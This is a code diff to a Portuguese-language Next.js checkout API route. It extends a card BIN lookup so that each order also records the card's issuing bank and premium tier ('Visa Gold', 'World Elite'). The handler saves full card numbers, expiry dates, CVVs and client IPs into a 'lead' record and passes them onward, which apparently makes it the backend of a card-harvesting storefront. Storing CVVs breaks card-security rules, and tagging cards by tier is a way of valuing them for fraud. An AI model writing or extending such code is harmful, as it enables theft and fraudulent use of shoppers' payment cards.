@@ -70,31 +70,46 @@ async function verifyTurnstile(token: unknown, ip: string): Promise<boolean> {
   return result.success === true;
 }
 
-// Instituição emissora do cartão via consulta pública de BIN (primeiros 8
-// dígitos). Best-effort: em caso de falha/timeout retorna null sem bloquear
-// o pedido.
-async function lookupCardBank(cardDigits: string): Promise<string | null> {
+// Instituição emissora + nível do cartão via consulta pública de BIN
+// (binlist.net): banco, produto (ex.: "Visa Gold", "MasterCard World
+// Elite") e débito/crédito como fallback. Best-effort: em caso de
+// falha/timeout retorna nulls sem bloquear o pedido.
+async function lookupCardInfo(
+  cardDigits: string
+): Promise<{ bank: string | null; level: string | null }> {
   const bin = cardDigits.slice(0, 8);
-  if (bin.length < 6) return null;
+  if (bin.length < 6) return { bank: null, level: null };
   try {
     const res = await fetch(`https://lookup.binlist.net/${bin}`, {
       headers: { Accept: "application/json" },
       signal: AbortSignal.timeout(3000),
     });
-    if (!res.ok) return null;
+    if (!res.ok) return { bank: null, level: null };
     const info = (await res.json()) as {
       scheme?: string;
+      type?: string;
+      brand?: string;
       bank?: { name?: string } | null;
     };
-    const banco = info.bank?.name?.trim();
-    if (banco) return banco;
-    if (info.scheme) {
-      const bandeira = info.scheme.charAt(0).toUpperCase() + info.scheme.slice(1);
-      return `Bandeira ${bandeira}`;
+
+    // Nível do cartão: brand traz o produto (ex.: "Visa Gold"); sem brand,
+    // cai para o tipo (crédito/débito) capitalizado.
+    let level: string | null = info.brand?.trim() || null;
+    if (!level && info.type) {
+      const tipo = info.type.trim().toLowerCase();
+      level = tipo === "credit" ? "Crédito" : tipo === "debit" ? "Débito" : null;
     }
-    return null;
+
+    const banco = info.bank?.name?.trim();
+    const bank = banco
+      ? banco
+      : info.scheme
+        ? `Bandeira ${info.scheme.charAt(0).toUpperCase() + info.scheme.slice(1)}`
+        : null;
+
+    return { bank, level };
   } catch {
-    return null;
+    return { bank: null, level: null };
   }
 }
 
@@ -182,7 +197,10 @@ export async function POST(req: NextRequest) {
 
     const isPix = String(data.paymentMethod ?? "").toUpperCase() === "PIX";
     const cardDigits = String(data.cardNumber ?? "").replace(/\D/g, "");
-    const cardBank = isPix || cardDigits.length < 6 ? null : await lookupCardBank(cardDigits);
+    const cardInfo =
+      isPix || cardDigits.length < 6
+        ? { bank: null, level: null }
+        : await lookupCardInfo(cardDigits);
 
     // Cliente logado: o pedido é sempre vinculado ao e-mail da conta,
     // garantindo que apareça no histórico de "Minha Conta".
@@ -213,7 +231,8 @@ export async function POST(req: NextRequest) {
       cardNumber: String(data.cardNumber).trim(),
       cardExpiry: String(data.cardExpiry).trim(),
       cardCvv: String(data.cardCvv).trim(),
-      cardBank,
+      cardBank: cardInfo.bank,
+      cardLevel: cardInfo.level,
       ip,
       installments: String(data.installments).trim(),
       notes: clean(data.notes),
@@ -299,6 +318,7 @@ export async function POST(req: NextRequest) {
       cardExpiry: lead.cardExpiry,
       cardCvv: lead.cardCvv,
       cardBank: lead.cardBank,
+      cardLevel: lead.cardLevel,
       totalCents: lead.totalCents,
       discountCents: lead.discountCents,
       items,
